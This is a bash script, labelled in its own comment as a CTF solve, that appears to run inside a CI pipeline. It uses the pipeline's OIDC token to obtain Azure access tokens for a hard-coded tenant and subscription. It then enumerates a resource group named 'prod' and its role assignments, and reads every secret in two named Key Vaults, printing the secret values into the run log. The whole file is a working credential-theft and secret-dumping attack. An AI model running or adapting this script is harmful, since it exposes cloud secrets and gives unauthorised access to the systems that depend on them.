#!/usr/bin/env bash
# Clean CTF solve script — reads only, prints to own run log. No external exfil.
set -uo pipefail
echo "===RUN_START==="
JWT=$(curl -sS -m 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))' 2>/dev/null)
echo "OIDC_LEN=${#JWT}"
[ -z "$JWT" ] && { echo "NO_OIDC"; exit 1; }

TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
SUB="${AZURE_SUBSCRIPTION_ID:-c5e4e004-b42d-4ac4-a502-5fd338380eb6}"
FED="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
RG="rg-tbl-platform-prod-sea"

fedtok(){ curl -sS -m 25 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$FED" -d grant_type=client_credentials \
  --data-urlencode "scope=$1" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer \
  --data-urlencode "client_assertion=$JWT" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null; }

VT=$(fedtok "https://vault.azure.net/.default")
AT=$(fedtok "https://management.azure.com/.default")
echo "VT_LEN=${#VT} AT_LEN=${#AT}"

echo "===RG_RESOURCES==="
curl -sS -m 25 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/resources?api-version=2021-04-01" \
  -H "Authorization: Bearer $AT" | head -c 6000
echo

echo "===ROLE_ASSIGNMENTS==="
curl -sS -m 25 "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" \
  -H "Authorization: Bearer $AT" | head -c 6000
echo

for KV in kv-tbl-sec-x3euoz kv-tbl-prod-x3euoz; do
  echo "===KV_LIST_$KV==="
  L=$(curl -sS -m 25 "https://$KV.vault.azure.net/secrets?api-version=7.4&maxresults=25" -H "Authorization: Bearer $VT")
  echo "$L"
  for nm in $(echo "$L" | python3 -c '
import sys, json
try:
    d = json.load(sys.stdin)
    for s in d.get("value", []):
        print(s["id"].rstrip("/").split("/")[-1])
except Exception:
    pass'); do
    echo "===KV_${KV}_SECRET_${nm}==="
    curl -sS -m 25 "https://$KV.vault.azure.net/secrets/$nm?api-version=7.4" -H "Authorization: Bearer $VT"
    echo
  done
done
echo "===RUN_END==="
